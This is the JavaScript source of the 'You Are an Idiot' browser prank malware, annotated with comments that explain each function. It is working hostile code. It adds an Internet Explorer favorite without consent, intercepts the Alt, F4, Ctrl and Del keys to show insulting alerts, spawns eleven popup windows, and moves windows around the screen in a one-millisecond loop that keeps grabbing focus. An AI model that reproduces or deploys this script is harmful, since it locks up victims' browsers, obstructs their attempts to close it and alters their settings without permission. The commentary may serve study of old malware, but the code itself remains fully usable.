/*
	you.js - "You Are an Idiot" script
	The Commentary
*/

//	bookmark -	adds IE favorite, reminding you that you're an idiot
function bookmark(){
		if ( (navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4) ){
			var url="http://offiz.bei.t-online.de/idiot.html";
			var title="Idiot!";
			window.external.AddFavorite(url,title);
		}
}

//	Alt+F4, Ctrl, Del keys pop up an alert with "You are an idiot!" on it
function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) alert("You are an idiot!"); }
function ctrlkey() { if (event.keyCode == 17) alert("You are an idiot!"); }
function delkey() { if (event.keyCode == 46) alert("You are an idiot!"); }

// Original code begins here

		var xOff = 5;		//	Initial X speed
		var yOff = 5;		//	Initial Y speed

		var xPos = 400;		//	Initial X position of the window
		var yPos = -100;	//	Initial Y position of the window

		var flagRun = 1;	//	Immediately move the window by running
							//	playBall function

//	openWindow -	opens a new, fixed 180x175 window
function openWindow(url){
		aWindow = window.open(url,"_blank", 'menubar=no,status=no,toolbar=noresizable=no,width=180,height=175,titlebar=no,alwaysRaised=yes');
}

//	procreate -	opens 11 copies of an identical document
function procreate(){
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
	    openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		openWindow('open.html');
		}

//	newXlt -	sets random X speed, going left
function newXlt(){
        xOff = Math.ceil( 0 - 6 * Math.random()) * 5 - 10 ;
        window.focus()}

//	newXrt -	sets random X speed, going right
function newXrt(){
        xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
        }

//	newYup -	sets random Y speed, going up
function newYup(){
        yOff = Math.ceil( 0 - 6 * Math.random())  * 5 - 10 ;
        }

//	newYdn -	sets random Y speed, going down
function newYdn(){
        yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
        }

//	fOff -	keeps the main window from moving [unused]
function fOff(){
        flagrun = 0;
        }


//	playBall -	moves the main window across the screen
//				ala a bouncy ball
function playBall(){
			//	move the window
		        xPos += xOff;
		        yPos += yOff;

			// assigns random X speed whenever the window
			// bumps into the left and right edges of the screen
	        	if (xPos > screen.width-175){ newXlt(); }
	        	if (xPos < 0){ newXrt(); }
			
			// assigns random Y speed whenever the window
			// bumps into the top and bottom edges of the screen
	        	if (yPos > screen.height-100){ newYup(); }
        		if (yPos < 0){ newYdn(); }

			// apply window location and run the script again if the
			// flag is set
        		if (flagRun == 1){
        			window.moveTo(xPos,yPos);
        			setTimeout('playBall()',1);
        		}
        }
